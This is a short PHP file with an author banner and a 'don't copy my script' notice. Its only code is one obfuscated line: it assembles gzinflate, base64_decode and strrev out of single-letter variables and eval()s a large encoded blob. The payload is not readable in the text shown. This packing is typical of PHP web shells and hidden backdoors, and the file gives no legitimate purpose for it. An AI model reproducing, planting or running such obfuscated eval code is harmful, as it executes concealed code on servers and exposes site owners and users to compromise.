<?php																								/***
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Name		  :	Tubagus Sya'banii
Youtube		  :	I'am Tubasya
Instagram	  :	@im.tubasya
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Date              :     2021-10-12 20:15:11 WIB
Ip Address        :     Null
City              :     Tangerang City
Country           :     ID (Indonesian)
Region            :     Banten / East Java
User-Agent        :     Mozilla/5.0 (X11; Linux x86_64; Android 10; ASUS X00TD ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 						***/

/*Please Don't Copy My Script!! ~ By : Iam Tubasya */

/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */
/* START */ $rGuW='e';$xYah='t';$IUlku='o';$GQc='r';$TXZ='a';$ZsieT='c';$ax='g';$QG='6';$RIWrG='f';$nGNiY='s';$F='_';$xqFa='v';$baSJK='b';$kLxe='4';$ipT='n';$gOU='l';$NJs='i';$idOpu='d';$iKRYL='z';$x=$ax.$iKRYL.$NJs.$ipT.$RIWrG.$gOU.$TXZ.$xYah.$rGuW;$cB=$baSJK.$TXZ.$nGNiY.$rGuW.$QG.$kLxe.$F.$idOpu.$rGuW.$ZsieT.$IUlku.$idOpu.$rGuW;$FP=$nGNiY.$xYah.$GQc.$GQc.$rGuW.$xqFa;eval($x($FP($cB('F/hYAW3dMNyFK2mQ4EOf6Z4wgt3Iu+/g87YJD/b6OWcDXwUzUtlmlEkBFoCsNto+0JCr9CuzXq4W4kJYBBLNq7CHs6WO49msLXECGh0dg//tBAnpChJfcDMsjd/8AE4BfBVoKEfHGikUuTM1zYGH0BK+T97xjt+P2PxQqXNAUWMQP821Lv0J9uGk0yCiEm9FtMNVlQaErLGTzUwg9mkKkDqy34htuhVDRvXfA8bR9BlVUMuqt8B2mm7UVqB66qxUtaMTZ3a7DYfksSnCXP3U+vDKsk+3HDOsnFG9xyTjiDwbJehFOwvYozp2i0e8unfM9QMr3A74O1/J37HeRTMq16nh9Bj+F7/Ppa/cg+J3P5Oxolu0OTeObEsldks+LP9+4wweN6YUCcSd4JQm8vuUhJtRKFLbn5P0zUP90VfBG9/sSdA+2bDzlN+c350TTev630JhfW67IiaX2OnWDrGuFoCa/Msy3gDVKiT4hASq2G38IeP7yib8aMDJpvrDdRHz8b3xQmnRKVa5DBiWZeYs1QYETLo0fHnRo5haEVhwUhFy1fYK3b1L4vzl41kh1tN7i1DyxS3vusl5bBrKlpNwWEJ7tTAPl6X2gfc9qlJYzcu3g9qEA74oe8sO7vW+haVunhv4XfPY5/fRTp2vXWUyEqPZinGSS4jjCd/KjrosqSVGGLMZwQeFO4FZ2VzVDQsZVYIROaIsApGCt/0zPwLWp1BJOGO1Lmq5vb6V/YYerq8ZsWaHxbfm5pMeukf7aub1zi8aZo7Pu1SSq8lRluCRRpqtblhcTGt2Cn2tt6+Cqz5nhxwHk08+l6/Bp5TRkNWVSCBsplKEKl2j75omsluhguK5C0Q3r2HGH9hw4w46dFkstci6CeQtGR9DBeCR9nxc/66fuoxg4SYNGjbifVsX9glK5oJ2f6Te65fF0EvYXsJNFPJapV5oJj9VeZ+6jGFGiQQuW5C6dlWMkB0w2oW5hvBEBUxgtNWXLUYqrIXeR89LKkJOUslYaKRoeKJTsaWu8i6nk1omFEoTU6n6uVM8/L9nI57p4e7w+PlBkWKWQdTso79f4nJSQyJRGJaKaDMisBisl0PWtmmknDONYnvzegDiDghBX77+EDbbb21UjQ=='))));
/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */
?>
